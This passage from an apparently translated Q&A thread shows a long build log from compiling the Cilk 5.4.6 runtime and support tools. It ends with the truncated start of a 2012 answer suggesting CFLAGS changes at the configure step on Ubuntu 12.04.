 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-malloc.lo -MD -MP -MF .deps/libcilk_p_la-malloc.Tpo -c malloc.c  -fPIC -DPIC -o .libs/libcilk_p_la-malloc.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-malloc.lo -MD -MP -MF .deps/libcilk_p_la-malloc.Tpo -c malloc.c -o libcilk_p_la-malloc.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-malloc.Tpo .deps/libcilk_p_la-malloc.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-debug.lo -MD -MP -MF .deps/libcilk_p_la-debug.Tpo -c -o libcilk_p_la-debug.lo `test -f 'debug.c' || echo './'`debug.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-debug.lo -MD -MP -MF .deps/libcilk_p_la-debug.Tpo -c debug.c  -fPIC -DPIC -o .libs/libcilk_p_la-debug.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-debug.lo -MD -MP -MF .deps/libcilk_p_la-debug.Tpo -c debug.c -o libcilk_p_la-debug.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-debug.Tpo .deps/libcilk_p_la-debug.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-workers.lo -MD -MP -MF .deps/libcilk_p_la-workers.Tpo -c -o libcilk_p_la-workers.lo `test -f 'workers.c' || echo './'`workers.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-workers.lo -MD -MP -MF .deps/libcilk_p_la-workers.Tpo -c workers.c  -fPIC -DPIC -o .libs/libcilk_p_la-workers.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-workers.lo -MD -MP -MF .deps/libcilk_p_la-workers.Tpo -c workers.c -o libcilk_p_la-workers.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-workers.Tpo .deps/libcilk_p_la-workers.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-mutex.lo -MD -MP -MF .deps/libcilk_p_la-mutex.Tpo -c -o libcilk_p_la-mutex.lo `test -f 'mutex.c' || echo './'`mutex.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-mutex.lo -MD -MP -MF .deps/libcilk_p_la-mutex.Tpo -c mutex.c  -fPIC -DPIC -o .libs/libcilk_p_la-mutex.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-mutex.lo -MD -MP -MF .deps/libcilk_p_la-mutex.Tpo -c mutex.c -o libcilk_p_la-mutex.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-mutex.Tpo .deps/libcilk_p_la-mutex.Plo
/bin/bash ../libtool --tag=CC   --mode=link gcc -pthread -g -O2   -o libcilk.p.la -rpath /usr/local/lib libcilk_p_la-sysdep.lo libcilk_p_la-cilk.lo libcilk_p_la-sched.lo libcilk_p_la-hooks.lo libcilk_p_la-stats.lo libcilk_p_la-barrier.lo libcilk_p_la-cmdline.lo libcilk_p_la-internal-malloc.lo libcilk_p_la-timing.lo libcilk_p_la-invoke-main.lo libcilk_p_la-malloc.lo libcilk_p_la-debug.lo libcilk_p_la-workers.lo libcilk_p_la-mutex.lo   -lm 
gcc -shared  .libs/libcilk_p_la-sysdep.o .libs/libcilk_p_la-cilk.o .libs/libcilk_p_la-sched.o .libs/libcilk_p_la-hooks.o .libs/libcilk_p_la-stats.o .libs/libcilk_p_la-barrier.o .libs/libcilk_p_la-cmdline.o .libs/libcilk_p_la-internal-malloc.o .libs/libcilk_p_la-timing.o .libs/libcilk_p_la-invoke-main.o .libs/libcilk_p_la-malloc.o .libs/libcilk_p_la-debug.o .libs/libcilk_p_la-workers.o .libs/libcilk_p_la-mutex.o  -lm  -pthread -Wl,-soname -Wl,libcilk.p.so.0 -o .libs/libcilk.p.so.0.0.0
(cd .libs && rm -f libcilk.p.so.0 && ln -s libcilk.p.so.0.0.0 libcilk.p.so.0)
(cd .libs && rm -f libcilk.p.so && ln -s libcilk.p.so.0.0.0 libcilk.p.so)
ar cru .libs/libcilk.p.a  libcilk_p_la-sysdep.o libcilk_p_la-cilk.o libcilk_p_la-sched.o libcilk_p_la-hooks.o libcilk_p_la-stats.o libcilk_p_la-barrier.o libcilk_p_la-cmdline.o libcilk_p_la-internal-malloc.o libcilk_p_la-timing.o libcilk_p_la-invoke-main.o libcilk_p_la-malloc.o libcilk_p_la-debug.o libcilk_p_la-workers.o libcilk_p_la-mutex.o
ranlib .libs/libcilk.p.a
creating libcilk.p.la
(cd .libs && rm -f libcilk.p.la && ln -s ../libcilk.p.la libcilk.p.la)
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-sysdep.lo -MD -MP -MF .deps/libcilk_g_p_la-sysdep.Tpo -c -o libcilk_g_p_la-sysdep.lo `test -f 'sysdep.c' || echo './'`sysdep.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-sysdep.lo -MD -MP -MF .deps/libcilk_g_p_la-sysdep.Tpo -c sysdep.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-sysdep.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-sysdep.lo -MD -MP -MF .deps/libcilk_g_p_la-sysdep.Tpo -c sysdep.c -o libcilk_g_p_la-sysdep.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-sysdep.Tpo .deps/libcilk_g_p_la-sysdep.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-cilk.lo -MD -MP -MF .deps/libcilk_g_p_la-cilk.Tpo -c -o libcilk_g_p_la-cilk.lo `test -f 'cilk.c' || echo './'`cilk.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-cilk.lo -MD -MP -MF .deps/libcilk_g_p_la-cilk.Tpo -c cilk.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-cilk.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-cilk.lo -MD -MP -MF .deps/libcilk_g_p_la-cilk.Tpo -c cilk.c -o libcilk_g_p_la-cilk.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-cilk.Tpo .deps/libcilk_g_p_la-cilk.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-sched.lo -MD -MP -MF .deps/libcilk_g_p_la-sched.Tpo -c -o libcilk_g_p_la-sched.lo `test -f 'sched.c' || echo './'`sched.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-sched.lo -MD -MP -MF .deps/libcilk_g_p_la-sched.Tpo -c sched.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-sched.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-sched.lo -MD -MP -MF .deps/libcilk_g_p_la-sched.Tpo -c sched.c -o libcilk_g_p_la-sched.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-sched.Tpo .deps/libcilk_g_p_la-sched.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-hooks.lo -MD -MP -MF .deps/libcilk_g_p_la-hooks.Tpo -c -o libcilk_g_p_la-hooks.lo `test -f 'hooks.c' || echo './'`hooks.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-hooks.lo -MD -MP -MF .deps/libcilk_g_p_la-hooks.Tpo -c hooks.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-hooks.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-hooks.lo -MD -MP -MF .deps/libcilk_g_p_la-hooks.Tpo -c hooks.c -o libcilk_g_p_la-hooks.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-hooks.Tpo .deps/libcilk_g_p_la-hooks.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-stats.lo -MD -MP -MF .deps/libcilk_g_p_la-stats.Tpo -c -o libcilk_g_p_la-stats.lo `test -f 'stats.c' || echo './'`stats.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-stats.lo -MD -MP -MF .deps/libcilk_g_p_la-stats.Tpo -c stats.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-stats.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-stats.lo -MD -MP -MF .deps/libcilk_g_p_la-stats.Tpo -c stats.c -o libcilk_g_p_la-stats.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-stats.Tpo .deps/libcilk_g_p_la-stats.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-barrier.lo -MD -MP -MF .deps/libcilk_g_p_la-barrier.Tpo -c -o libcilk_g_p_la-barrier.lo `test -f 'barrier.c' || echo './'`barrier.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-barrier.lo -MD -MP -MF .deps/libcilk_g_p_la-barrier.Tpo -c barrier.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-barrier.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-barrier.lo -MD -MP -MF .deps/libcilk_g_p_la-barrier.Tpo -c barrier.c -o libcilk_g_p_la-barrier.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-barrier.Tpo .deps/libcilk_g_p_la-barrier.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_g_p_la-cmdline.Tpo -c -o libcilk_g_p_la-cmdline.lo `test -f 'cmdline.c' || echo './'`cmdline.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_g_p_la-cmdline.Tpo -c cmdline.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-cmdline.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_g_p_la-cmdline.Tpo -c cmdline.c -o libcilk_g_p_la-cmdline.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-cmdline.Tpo .deps/libcilk_g_p_la-cmdline.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-internal-malloc.Tpo -c -o libcilk_g_p_la-internal-malloc.lo `test -f 'internal-malloc.c' || echo './'`internal-malloc.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-internal-malloc.Tpo -c internal-malloc.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-internal-malloc.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-internal-malloc.Tpo -c internal-malloc.c -o libcilk_g_p_la-internal-malloc.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-internal-malloc.Tpo .deps/libcilk_g_p_la-internal-malloc.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-timing.lo -MD -MP -MF .deps/libcilk_g_p_la-timing.Tpo -c -o libcilk_g_p_la-timing.lo `test -f 'timing.c' || echo './'`timing.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-timing.lo -MD -MP -MF .deps/libcilk_g_p_la-timing.Tpo -c timing.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-timing.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-timing.lo -MD -MP -MF .deps/libcilk_g_p_la-timing.Tpo -c timing.c -o libcilk_g_p_la-timing.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-timing.Tpo .deps/libcilk_g_p_la-timing.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_g_p_la-invoke-main.Tpo -c -o libcilk_g_p_la-invoke-main.lo `test -f 'invoke-main.c' || echo './'`invoke-main.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_g_p_la-invoke-main.Tpo -c invoke-main.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-invoke-main.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_g_p_la-invoke-main.Tpo -c invoke-main.c -o libcilk_g_p_la-invoke-main.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-invoke-main.Tpo .deps/libcilk_g_p_la-invoke-main.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-malloc.Tpo -c -o libcilk_g_p_la-malloc.lo `test -f 'malloc.c' || echo './'`malloc.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-malloc.Tpo -c malloc.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-malloc.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-malloc.lo -MD -MP -MF .deps/libcilk_g_p_la-malloc.Tpo -c malloc.c -o libcilk_g_p_la-malloc.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-malloc.Tpo .deps/libcilk_g_p_la-malloc.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-debug.lo -MD -MP -MF .deps/libcilk_g_p_la-debug.Tpo -c -o libcilk_g_p_la-debug.lo `test -f 'debug.c' || echo './'`debug.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-debug.lo -MD -MP -MF .deps/libcilk_g_p_la-debug.Tpo -c debug.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-debug.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-debug.lo -MD -MP -MF .deps/libcilk_g_p_la-debug.Tpo -c debug.c -o libcilk_g_p_la-debug.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-debug.Tpo .deps/libcilk_g_p_la-debug.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-workers.lo -MD -MP -MF .deps/libcilk_g_p_la-workers.Tpo -c -o libcilk_g_p_la-workers.lo `test -f 'workers.c' || echo './'`workers.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-workers.lo -MD -MP -MF .deps/libcilk_g_p_la-workers.Tpo -c workers.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-workers.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-workers.lo -MD -MP -MF .deps/libcilk_g_p_la-workers.Tpo -c workers.c -o libcilk_g_p_la-workers.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-workers.Tpo .deps/libcilk_g_p_la-workers.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1  -pthread -g -O2 -MT libcilk_g_p_la-mutex.lo -MD -MP -MF .deps/libcilk_g_p_la-mutex.Tpo -c -o libcilk_g_p_la-mutex.lo `test -f 'mutex.c' || echo './'`mutex.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-mutex.lo -MD -MP -MF .deps/libcilk_g_p_la-mutex.Tpo -c mutex.c  -fPIC -DPIC -o .libs/libcilk_g_p_la-mutex.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -DCILK_DEBUG=1 -pthread -g -O2 -MT libcilk_g_p_la-mutex.lo -MD -MP -MF .deps/libcilk_g_p_la-mutex.Tpo -c mutex.c -o libcilk_g_p_la-mutex.o >/dev/null 2>&1
mv -f .deps/libcilk_g_p_la-mutex.Tpo .deps/libcilk_g_p_la-mutex.Plo
/bin/bash ../libtool --tag=CC   --mode=link gcc -pthread -g -O2   -o libcilk.g.p.la -rpath /usr/local/lib libcilk_g_p_la-sysdep.lo libcilk_g_p_la-cilk.lo libcilk_g_p_la-sched.lo libcilk_g_p_la-hooks.lo libcilk_g_p_la-stats.lo libcilk_g_p_la-barrier.lo libcilk_g_p_la-cmdline.lo libcilk_g_p_la-internal-malloc.lo libcilk_g_p_la-timing.lo libcilk_g_p_la-invoke-main.lo libcilk_g_p_la-malloc.lo libcilk_g_p_la-debug.lo libcilk_g_p_la-workers.lo libcilk_g_p_la-mutex.lo   -lm 
gcc -shared  .libs/libcilk_g_p_la-sysdep.o .libs/libcilk_g_p_la-cilk.o .libs/libcilk_g_p_la-sched.o .libs/libcilk_g_p_la-hooks.o .libs/libcilk_g_p_la-stats.o .libs/libcilk_g_p_la-barrier.o .libs/libcilk_g_p_la-cmdline.o .libs/libcilk_g_p_la-internal-malloc.o .libs/libcilk_g_p_la-timing.o .libs/libcilk_g_p_la-invoke-main.o .libs/libcilk_g_p_la-malloc.o .libs/libcilk_g_p_la-debug.o .libs/libcilk_g_p_la-workers.o .libs/libcilk_g_p_la-mutex.o  -lm  -pthread -Wl,-soname -Wl,libcilk.g.p.so.0 -o .libs/libcilk.g.p.so.0.0.0
(cd .libs && rm -f libcilk.g.p.so.0 && ln -s libcilk.g.p.so.0.0.0 libcilk.g.p.so.0)
(cd .libs && rm -f libcilk.g.p.so && ln -s libcilk.g.p.so.0.0.0 libcilk.g.p.so)
ar cru .libs/libcilk.g.p.a  libcilk_g_p_la-sysdep.o libcilk_g_p_la-cilk.o libcilk_g_p_la-sched.o libcilk_g_p_la-hooks.o libcilk_g_p_la-stats.o libcilk_g_p_la-barrier.o libcilk_g_p_la-cmdline.o libcilk_g_p_la-internal-malloc.o libcilk_g_p_la-timing.o libcilk_g_p_la-invoke-main.o libcilk_g_p_la-malloc.o libcilk_g_p_la-debug.o libcilk_g_p_la-workers.o libcilk_g_p_la-mutex.o
ranlib .libs/libcilk.g.p.a
creating libcilk.g.p.la
(cd .libs && rm -f libcilk.g.p.la && ln -s ../libcilk.g.p.la libcilk.g.p.la)
make[3]: Leaving directory `/home/khaled/Desktop/cilk-5.4.6/runtime'
make[2]: Leaving directory `/home/khaled/Desktop/cilk-5.4.6/runtime'
Making all in support
make[2]: Entering directory `/home/khaled/Desktop/cilk-5.4.6/support'
gcc -DHAVE_CONFIG_H -I. -I.. -I../runtime  -DCILKHEADER_DIR="\"/usr/local/include/cilk\"" -DCILK2C_DIR="\"/usr/local/lib/cilk\"" -DLIBS_DIR="\"/usr/local/lib\"" -DLIBS2_DIR="\"/usr/local/lib/cilk\""   -g -O2 -MT cilkc-cilkc.o -MD -MP -MF .deps/cilkc-cilkc.Tpo -c -o cilkc-cilkc.o `test -f 'cilkc.c' || echo './'`cilkc.c
mv -f .deps/cilkc-cilkc.Tpo .deps/cilkc-cilkc.Po
gcc -DHAVE_CONFIG_H -I. -I.. -I../runtime  -DCILKHEADER_DIR="\"/usr/local/include/cilk\"" -DCILK2C_DIR="\"/usr/local/lib/cilk\"" -DLIBS_DIR="\"/usr/local/lib\"" -DLIBS2_DIR="\"/usr/local/lib/cilk\""   -g -O2 -MT cilkc-make-temp-file.o -MD -MP -MF .deps/cilkc-make-temp-file.Tpo -c -o cilkc-make-temp-file.o `test -f 'make-temp-file.c' || echo './'`make-temp-file.c
mv -f .deps/cilkc-make-temp-file.Tpo .deps/cilkc-make-temp-file.Po
/bin/bash ../libtool --tag=CC   --mode=link gcc  -g -O2   -o cilkc cilkc-cilkc.o cilkc-make-temp-file.o  -lm 
mkdir .libs
gcc -g -O2 -o cilkc cilkc-cilkc.o cilkc-make-temp-file.o  -lm
gcc -DHAVE_CONFIG_H -I. -I.. -I../runtime  -DCILKHEADER_DIR="\"`(cd ..; pwd)`/runtime\"" -DCILK_RTSBUILD_DIR="\"`(cd ..; pwd)`/runtime\"" -DCILK2C_DIR="\"`(cd ..; pwd)`/cilk2c\"" -DLIBS_DIR="\"`(cd ..; pwd)`/runtime/.libs\"" -DLIBS2_DIR="\"`(cd ..; pwd)`/runtime\""   -g -O2 -MT cilkclocal-cilkc.o -MD -MP -MF .deps/cilkclocal-cilkc.Tpo -c -o cilkclocal-cilkc.o `test -f 'cilkc.c' || echo './'`cilkc.c
mv -f .deps/cilkclocal-cilkc.Tpo .deps/cilkclocal-cilkc.Po
gcc -DHAVE_CONFIG_H -I. -I.. -I../runtime  -DCILKHEADER_DIR="\"`(cd ..; pwd)`/runtime\"" -DCILK_RTSBUILD_DIR="\"`(cd ..; pwd)`/runtime\"" -DCILK2C_DIR="\"`(cd ..; pwd)`/cilk2c\"" -DLIBS_DIR="\"`(cd ..; pwd)`/runtime/.libs\"" -DLIBS2_DIR="\"`(cd ..; pwd)`/runtime\""   -g -O2 -MT cilkclocal-make-temp-file.o -MD -MP -MF .deps/cilkclocal-make-temp-file.Tpo -c -o cilkclocal-make-temp-file.o `test -f 'make-temp-file.c' || echo './'`make-temp-file.c
mv -f .deps/cilkclocal-make-temp-file.Tpo .deps/cilkclocal-make-temp-file.Po
/bin/bash ../libtool --tag=CC   --mode=link gcc  -g -O2   -o cilkclocal cilkclocal-cilkc.o cilkclocal-make-temp-file.o  -lm 
gcc -g -O2 -o cilkclocal cilkclocal-cilkc.o cilkclocal-make-temp-file.o  -lm
make[2]: Leaving directory `/home/khaled/Desktop/cilk-5.4.6/support'
Making all in examples
make[2]: Entering directory `/home/khaled/Desktop/cilk-5.4.6/examples'
../support/cilkclocal -DHAVE_CONFIG_H -I. -I.. -I../runtime     -g -O2 -c -o hello.o hello.cilk
../support/cilkclocal  -g -O2   -o hello hello.o  -lm 
../support/cilkclocal -DHAVE_CONFIG_H -I. -I.. -I../runtime     -g -O2 -c -o fib.o fib.cilk
/usr/include/i386-li 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-16T12:47:45.963

我在 Ubuntu 12.04 x86_64 上遇到了同样的问题。通过在配置步骤中向 CFLAGS 变量添加一些值来解决它，

```
